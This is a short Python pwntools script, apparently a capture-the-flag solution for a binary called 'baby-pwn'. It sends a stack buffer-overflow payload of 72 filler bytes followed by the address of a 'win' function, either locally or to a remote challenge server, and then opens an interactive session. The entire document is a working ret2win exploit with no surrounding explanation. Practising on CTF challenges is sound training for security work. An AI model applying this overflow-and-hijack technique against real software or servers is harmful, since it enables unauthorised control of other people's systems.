#!/usr/bin/env python3

from pwn import *

elf = ELF("./baby-pwn_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("34.162.142.123", 5000)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    winfun = 0x401166
    payload = flat(b'A'*72, winfun)
    io.sendlineafter(b'Enter some text:', payload)

    io.interactive()

if __name__ == "__main__":
    main()
